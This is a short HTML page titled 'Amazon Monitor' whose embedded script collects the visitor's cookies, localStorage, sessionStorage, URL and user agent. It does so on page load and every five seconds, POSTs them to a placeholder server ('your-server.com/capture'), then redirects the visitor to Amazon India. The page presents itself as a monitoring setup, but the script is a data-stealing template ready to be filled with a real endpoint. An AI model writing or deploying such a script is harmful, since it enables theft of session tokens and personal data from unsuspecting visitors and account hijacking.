<!DOCTYPE html>
<html>
<head>
    <title>Amazon Monitor</title>
    <script>
        // Function to extract data and send to your server
        function captureData() {
            try {
                const data = {
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    url: window.location.href,
                    title: document.title,
                    userAgent: navigator.userAgent
                };
                
                // Send to your server (replace with your endpoint)
                fetch('https://your-server.com/capture', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: {'Content-Type': 'application/json'},
                    keepalive: true
                }).catch(e => console.log('Send failed:', e));
                
                // Also log locally
                console.log('Captured data:', data);
                alert('Data captured! Check console.');
            } catch(e) {
                console.error('Capture error:', e);
            }
        }
        
        // Capture when page loads
        window.addEventListener('load', captureData);
        
        // Set up interval to capture periodically
        setInterval(captureData, 5000);
        
        // Redirect to Amazon after 1 second
        setTimeout(function() {
            console.log('Redirecting to Amazon...');
            window.location.href = 'https://www.amazon.in';
        }, 1000);
    </script>
</head>
<body>
    <h1>Monitoring Setup...</h1>
    <p>Redirecting to Amazon in 1 second.</p>
</body>
</html>
